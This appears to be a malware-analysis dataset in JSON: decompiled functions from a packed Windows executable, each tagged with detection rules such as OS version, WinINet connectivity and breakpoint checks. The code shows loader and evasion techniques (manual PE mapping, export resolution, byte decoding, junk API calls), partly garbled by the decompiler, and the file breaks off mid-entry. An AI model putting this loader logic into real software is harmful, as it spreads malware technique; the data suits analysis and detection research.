{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h, ushort *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 8192 named .text\n    *(arg_ch + 2) = arg_8h;\n    var_ch = 0;\n    iVar1 = var_ch;\n    do {\n        var_ch = iVar1;\n        iVar1 = var_ch + 1;\n    } while (*(arg_8h + var_ch) != '\\0');\n    arg_ch[1] = var_ch;\n    *arg_ch = var_ch;\n    return;\n}\n",
        "token_count": 163
    },
    "00401046": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401138)\n\nvoid __cdecl fcn.00401046(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack64;\n    int32_t iStack56;\n    uint var_bp_ch;\n    \n    if (arg_14h == 0) {\n        iVar1 = *(arg_18h + 0x3c);\n        iStack56 = 0;\n        if (iVar1 != 0) {\n            do {\n                *(arg_8h + iStack56) = *(arg_ch + iStack56);\n                iStack56 = iStack56 + 1;\n            } while (iStack56 != iVar1);\n        }\n    }\n    iVar1 = *(arg_10h + 0xc);\n    iVar2 = *(arg_10h + 0x10);\n    iVar3 = *(arg_10h + 0x14);\n    iStack64 = 0;\n    if (iVar2 != 0) {\n        do {\n            *(arg_8h + iVar1 + iStack64) = *(arg_ch + iVar3 + iStack64);\n            iStack64 = iStack64 + 1;\n        } while (iStack64 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "004011eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004011eb(uint arg_8h, uint arg_ch)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_14h = *0x415da8;\n    if (*0x415da8 < 0x100) {\n        fcn.0040119b();\n        var_14h = *0x415da8;\n    }\n    var_1ch = 0;\n    *0x415da8 = var_14h;\n    if (0xff < var_14h) {\n        var_1ch = (*var_14h)(0, arg_ch, *0x415db0, arg_8h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 181
    },
    "00401272": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401272(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    uVar1 = arg_8h & 3;\n    if (2 < arg_ch) {\n        uVar1 = arg_8h % 0x32;\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "004014b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __cdecl fcn.004014b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_ch == 0) {\n        *0x415d90 = arg_8h;\n        return arg_8h != 0;\n    }\n    *0x415da0 = arg_8h;\n    return arg_8h != 0;\n}\n",
        "token_count": 116
    },
    "00401618": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401618(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x415d90 = 0;\n    *0x415da0 = 0;\n    if (arg_8h != 0) {\n        if (arg_8h == 1) {\n            *0x415d90 = 1;\n        }\n        else {\n            *0x415d90 = arg_8h;\n        }\n    }\n    if (arg_ch != 0) {\n        *0x415da0 = arg_ch + 4;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "0040168f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.0040168f(void)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n    (*_sym.imp.GDI32.dll_GetCurrentObject)(0x814b69, 0x32c);\n    var_8h = 0x8e4;\n    (*_sym.imp.KERNEL32.dll_GetNumberOfConsoleInputEvents)(0x70f152, &var_8h);\n    return iVar1 != 0;\n}\n",
        "token_count": 136
    },
    "004016e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016e7(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (iVar1 = arg_ch + *(arg_ch + 0x3c),  *(arg_ch + *(arg_ch + 0x3c)) == 'P')) &&\n       (iVar1 != 0 && *(iVar1 + 1) == 'E')) {\n        if (*(iVar1 + 6) != 0) {\n            var_18h = iVar1 + 0x18 + *(iVar1 + 0x14);\n            var_1ch = 0;\n            do {\n                fcn.00401046(arg_8h, arg_ch, var_18h, var_1ch, iVar1 + 0x18);\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + 0x28;\n            } while (var_1ch < *(iVar1 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "004017cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401827) overlaps instruction at (ram,0x00401825)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004017cb(void)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    int32_t iVar9;\n    int32_t extraout_ECX_04;\n    int32_t unaff_EBX;\n    uchar *puVar10;\n    uchar *puVar11;\n    int32_t *unaff_ESI;\n    int32_t *piVar12;\n    uint32_t unaff_EDI;\n    ushort in_ES;\n    uint16_t in_CS;\n    uint16_t in_SS;\n    bool bVar13;\n    bool bVar14;\n    ushort in_FPUStatusWord;\n    unkbyte6 Var15;\n    uint32_t uVar16;\n    ushort uVar17;\n    uint uStack16;\n    uint32_t uStack12;\n    int32_t iStack8;\n    \n    uStack16 = &stack0xfffffff4;\n    iStack8 = 0x72b6b630;\n    puVar10 = &stack0xfffffffc;\ncode_r0x004017de:\n    while( true ) {\n        uVar16 = 0x4017e5;\n        Var15 = (*_sym.imp.SETUPAPI.dll_SetupFindNextLine)();\n        pcVar2 = Var15 + -0x66e42f9f;\n        cVar5 = *pcVar2;\n        *pcVar2 = *pcVar2 << 1;\n        if ((cVar5 < '\\0' != *pcVar2 < '\\0') == *pcVar2 < '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar7 = Var15 + *(unaff_ESI + 0xeffec87);\n        uVar7 = uVar7 & 0xffffff00 | *(unaff_EBX + (uVar7 & 0xff));\n        *(puVar10 + -0x20) = in_FPUStatusWord;\n        pcVar2 = uVar7 + 0xbe77162d + extraout_ECX;\n        *pcVar2 = *pcVar2 >> 1;\n        uVar16 = uVar16 & 0xffff0000 | in_SS;\n        puVar4 = segment(in_ES, unaff_EDI);\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n        *puVar4 = uVar7;\n        unaff_EBX = -0x3ad30ee5;\n        piVar12 = unaff_ESI + 1;\n        out(*unaff_ESI, Var15 >> 0x20);\n        *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n        Var15 = (*_sym.imp.USER32.dll_RegisterClassExW)(in_CS, unaff_EDI, extraout_ECX, uVar16);\n        puVar8 = Var15;\n        puVar3 = puVar8 + -0x66e42f9f;\n        uVar6 = *puVar3;\n        *puVar3 = *puVar3 << 1;\n        iVar9 = extraout_ECX_00;\n        puVar11 = puVar10 + 1;\n        unaff_ESI = piVar12;\n        if ((uVar6 < '\\0' != *puVar3 < '\\0') != *puVar3 < '\\0') break;\n        *puVar8 = *puVar8 ^ Var15;\n        puVar10 = puVar10 + 1;\n    }\ncode_r0x00401825:\n    uVar17 = uVar16 >> 0x10;\n    uVar16 = Var15 + *(unaff_ESI + 0xeffec87);\n    uVar7 = uVar16 & 0xffffff00 | *((uVar16 & 0xff) + 0xc52cf11b);\n    *(puVar11 + -0x20) = in_FPUStatusWord;\n    pcVar2 = uVar7 + 0xbe77162d + iVar9;\n    *pcVar2 = *pcVar2 >> 1;\n    uVar16 = CONCAT22(uVar17, in_SS);\n    puVar4 = segment(in_ES, unaff_EDI);\n    unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n    *puVar4 = uVar7;\n    out(*unaff_ESI, Var15 >> 0x20);\n    *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n    puVar10 = puVar11 + 1;\n    piVar12 = unaff_ESI + 1;\n    do {\n        puVar11 = &stack0xfffffff0;\n        Var15 = (*0x402e4a)(in_CS, unaff_EDI, iVar9, uVar16);\n        pcVar2 = Var15 + -0x66e42f9f;\n        cVar5 = *pcVar2;\n        *pcVar2 = *pcVar2 << 1;\n        if ((cVar5 < '\\0' != *pcVar2 < '\\0') == *pcVar2 < '\\0') {\n            *piVar12 = *piVar12 + -1;\n            iVar9 = extraout_ECX_04;\n            goto code_r0x004018e7;\n        }\n        uVar7 = Var15 + *(piVar12 + 0xeffec87);\n        uVar7 = uVar7 & 0xffffff00 | *((uVar7 & 0xff) + 0xc52cf11b);\n        *(puVar10 + -0x20) = in_FPUStatusWord;\n        pcVar2 = uVar7 + 0xbe77162d + extraout_ECX_04;\n        *pcVar2 = *pcVar2 >> 1;\n        uVar16 = uVar16 & 0xffff0000 | in_SS;\n        puVar4 = segment(in_ES, unaff_EDI);\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n        *puVar4 = uVar7;\n        out(*piVar12, Var15 >> 0x20);\n        *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n        puVar11 = puVar10 + 1;\n        piVar1 = puVar10 + -7;\n        puVar10 = puVar11;\n        unaff_ESI = piVar12 + 1;\n        piVar12 = piVar12 + 1;\n        iVar9 = extraout_ECX_04;\n    } while (*piVar1 != 0);\n    while( true ) {\n        Var15 = (*_sym.imp.KERNEL32.dll_ExitThread)();\n        pcVar2 = Var15 + -0x66e42f9f;\n        cVar5 = *pcVar2;\n        *pcVar2 = *pcVar2 << 1;\n        bVar14 = cVar5 < '\\0' != *pcVar2 < '\\0';\n        bVar13 = *pcVar2 < '\\0';\n        iVar9 = extraout_ECX_02;\n        puVar10 = puVar11;\n        if (bVar14 == bVar13) break;\n        uVar16 = Var15 + *(unaff_ESI + 0xeffec87);\n        uVar16 = uVar16 & 0xffffff00 | *((uVar16 & 0xff) + 0xc52cf11b);\n        *(puVar11 + -0x20) = in_FPUStatusWord;\n        pcVar2 = uVar16 + 0xbe77162d + extraout_ECX_02;\n        *pcVar2 = *pcVar2 >> 1;\n        puVar4 = segment(in_ES, unaff_EDI);\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n        *puVar4 = uVar16;\n        uStack16 = uStack16 & 0xffff0000 | in_CS;\n        piVar12 = unaff_ESI + 1;\n        out(*unaff_ESI, Var15 >> 0x20);\n        *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n        puVar11 = puVar11 + 1;\n        uVar16 = 0x4018df;\n        uStack12 = unaff_EDI;\n        iStack8 = extraout_ECX_02;\n        Var15 = (*_sym.imp.USER32.dll_SendNotifyMessageW)();\n        puVar8 = Var15;\n        puVar3 = puVar8 + -0x66e42f9f;\n        uVar6 = *puVar3;\n        *puVar3 = *puVar3 << 1;\n        iVar9 = extraout_ECX_03;\n        if ((uVar6 < '\\0' != *puVar3 < '\\0') != *puVar3 < '\\0') goto code_r0x004018e7;\n        *puVar8 = *puVar8 ^ Var15;\n        unaff_ESI = piVar12;\n    }\n    goto code_r0x0040186a;\ncode_r0x004018e7:\n    uVar7 = Var15 + *(piVar12 + 0xeffec87);\n    uVar7 = uVar7 & 0xffffff00 | *((uVar7 & 0xff) + 0xc52cf11b);\n    *(puVar11 + -0x20) = in_FPUStatusWord;\n    pcVar2 = uVar7 + 0xbe77162d + iVar9;\n    *pcVar2 = *pcVar2 >> 1;\n    puVar4 = segment(in_ES, unaff_EDI);\n    unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n    *puVar4 = uVar7;\n    unaff_EBX = -0x3ad30ee5;\n    uStack16 = CONCAT22(uStack16._2_2_, in_CS);\n    unaff_ESI = piVar12 + 1;\n    out(*piVar12, Var15 >> 0x20);\n    *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n    puVar10 = puVar11 + 1;\n    if (*(puVar11 + -7) != 0) goto code_r0x004017de;\n    Var15 = (*0x402e14)();\n    pcVar2 = Var15 + -0x66e42f9f;\n    cVar5 = *pcVar2;\n    *pcVar2 = *pcVar2 << 1;\n    bVar14 = cVar5 < '\\0' != *pcVar2 < '\\0';\n    bVar13 = *pcVar2 < '\\0';\n    iVar9 = extraout_ECX_01;\ncode_r0x0040186a:\n    if (bVar14 != bVar13) goto code_r0x0040186c;\n    *unaff_ESI = *unaff_ESI + -1;\n    puVar11 = *0x10;\n    goto code_r0x00401825;\ncode_r0x0040186c:\n    uVar16 = Var15 + *(unaff_ESI + 0xeffec87);\n    uVar16 = uVar16 & 0xffffff00 | *((uVar16 & 0xff) + 0xc52cf11b);\n    *(puVar10 + -0x20) = in_FPUStatusWord;\n    pcVar2 = uVar16 + 0xbe77162d + iVar9;\n    *pcVar2 = *pcVar2 >> 1;\n    iStack8 = iVar9;\n    puVar4 = segment(in_ES, unaff_EDI);\n    unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI + 4;\n    *puVar4 = uVar16;\n    uStack12 = unaff_EDI;\n    unaff_EBX = -0x3ad30ee5;\n    uStack16 = uStack16 & 0xffff0000 | in_CS;\n    out(*unaff_ESI, Var15 >> 0x20);\n    *0xa75f10a2 = *0xa75f10a2 << 1 | *0xa75f10a2 < 0;\n    piVar12 = puVar10 + -7;\n    puVar10 = puVar10 + 1;\n    unaff_ESI = unaff_ESI + 1;\n    if (*piVar12 == 0) {\n        return 0xfc90e02;\n    }\n    goto code_r0x004017de;\n}\n",
        "token_count": 3001
    },
    "00401a9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401a9a(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 74
    },
    "00401ab4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401ab4(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint16_t *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    iVar4 = fcn.00402339();\n    iVar5 = 0;\n    if (*(iVar4 + 1 + *(iVar4 + 0x3c)) == 'E') {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        var_38h = iVar4 + *(iVar4 + iVar5 + 0x24);\n        var_3ch = 0;\n        do {\n            var_40h = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + var_3ch * 4) + var_40h);\n                cVar2 = *(arg_8h + var_40h);\n                if (cVar1 == '\\0') break;\n                var_40h = var_40h + 1;\n            } while ((cVar1 == cVar2 && cVar2 != '\\0') && var_40h < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *var_38h * 4);\n            }\n            var_3ch = var_3ch + 1;\n            var_38h = var_38h + 1;\n        } while (var_3ch < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 530
    },
    "00401bec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401bec(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    code *var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_68h;\n    uint var_64h;\n    int16_t *var_50h;\n    uint32_t var_4ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint32_t var_14h;\n    uint var_eh;\n    \n    var_eh._0_2_ = 0x23d2;\n    var_14h = 0x626a310c;\n    fcn.00402b18(&var_24h);\n    var_68h = var_24h;\n    var_64h = *0x415db4;\n    var_30h = *0x415d90;\n    var_2ch = *0x415d94;\n    var_28h = *0x415d98;\n    var_34h = *0x415d9c;\n    var_38h = *0x415da0;\n    for (var_ach = fcn.00401ff8;\n        ((var_50h = var_ach,  *var_ach != 0x5a4d ||\n         (iVar4 = var_ach + *(var_ach + 0x3c),  *(var_ach + *(var_ach + 0x3c)) != 'P')) || (*(iVar4 + 1) != 'E'));\n        var_ach = var_ach + -0x1000 & 0x626a210c - var_14h) {\n    }\n    iVar6 = 0;\n    if (*(iVar4 + 1) == 'E') {\n        iVar6 = iVar4;\n    }\n    uVar1 = *(iVar6 + 0x50);\n    var_4ch = uVar1;\n    pcVar3 = fcn.00402429(&var_9ch, var_1ch);\n    var_c8h = 0;\n    if (pcVar3 != NULL) {\n        uVar2 = var_14h ^ 0x626a310d;\n        uVar5 = 200;\n        if (uVar1 == var_14h + 0x9d95cef4) {\n            uVar5 = var_14h ^ 0x626a31cb;\n        }\n        var_c8h = 0x626a310d - var_14h;\n        (*pcVar3)(&var_9ch);\n        if (3 < uVar1) {\n            uVar2 = 2;\n        }\n        var_c8h = uVar2 + uVar5 + var_c8h;\n    }\n    return var_c8h;\n}\n",
        "token_count": 788
    },
    "00401de2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401e66)\n\nvoid __cdecl fcn.00401de2(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack40;\n    uint var_bp_ch;\n    \n    uStack40 = 0;\n    if (arg_10h != 0) {\n        do {\n            uVar1 = uStack40 & 7;\n            if (uStack40 < 8) {\n                uVar1 = uStack40;\n            }\n            if (arg_10h < uVar1 || 8 < uVar1) {\n                return;\n            }\n            *(arg_8h + uStack40) = *(arg_ch + uStack40) - *(uVar1 + 0x4034aa);\n            uStack40 = uStack40 + 1;\n        } while (uStack40 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00401f11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f11(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 4;\n    var_24h = 0;\n    do {\n        for (uVar1 = *(var_24h + 0x403477); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            uVar3 = var_20h + uVar1;\n            uVar2 = uVar1 & 3;\n            if (2 < var_20h) {\n                uVar2 = uVar1 % 0x32;\n            }\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar2 + 0x403444);\n            var_20h = uVar3;\n        }\n        var_24h = var_24h + 1;\n    } while (var_20h != 0 && var_24h < 0x33);\n    return;\n}\n",
        "token_count": 347
    },
    "0040211f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040211f(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 73
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint __cdecl entry0(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint in_stack_ffffff98;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    \n    (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    fcn.0040168f();\n    fcn.00401522();\n    (*_sym.imp.KERNEL32.dll_IsThreadAFiber)();\n    iVar1 = fcn.00402059(in_stack_ffffff98, _sym.imp.KERNEL32.dll_CloseHandle);\n    if (iVar1 == 0) {\n        *0x415d90 = 0;\n        *0x415da0 = NULL;\n        if ((unaff_ESI != 0) && (*0x415d90 = unaff_ESI,  unaff_ESI == 1)) {\n            *0x415d90 = 1;\n        }\n        if (*0x10 != 0x4) {\n            *0x415da0 = *0x10;\n        }\n        *0x415d94 = unaff_EDI;\n        *0x415d98 = unaff_EBX;\n        *0x415d9c = unaff_EBP;\n        fcn.00401bec();\n        (*_sym.imp.GDI32.dll_DrawEscape)(0x50a3dc, 0xd30, 0xd30, \"lvd*0j?#Fg\");\n        (*_sym.imp.KERNEL32.dll_LocalReAlloc)(0xc8406b, 0x4850a7, 0x65);\n    }\n    fcn.00401334();\n    fcn.0040139d();\n    return 0;\n}\n",
        "token_count": 605
    },
    "004021c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004021c2(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_18h = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + var_18h) = *(arg_ch + var_18h);\n            var_18h = var_18h + 1;\n        } while (var_18h != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 149
    },
    "00402210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402210(void)\n\n{\n    uint var_98h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint *var_84h;\n    uint *var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_67h;\n    uint var_56h;\n    uint var_dh;\n    \n    var_84h = &var_67h;\n    var_dh._0_1_ = 0xb0;\n    fcn.00401de2(var_84h, 0x403410, 0xe);\n    var_7ch = 0;\n    var_80h = &var_56h;\n    do {\n        if (*var_84h == '\\0') {\n            *var_80h = 0;\n            break;\n        }\n        *var_80h = *var_84h;\n        var_84h = var_84h + 1;\n        var_80h = var_80h + 2;\n        var_7ch = var_7ch + 1;\n    } while (var_7ch != 0x11);\n    fcn.00402572(&var_56h, 0);\n    return;\n}\n",
        "token_count": 328
    },
    "00402339": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
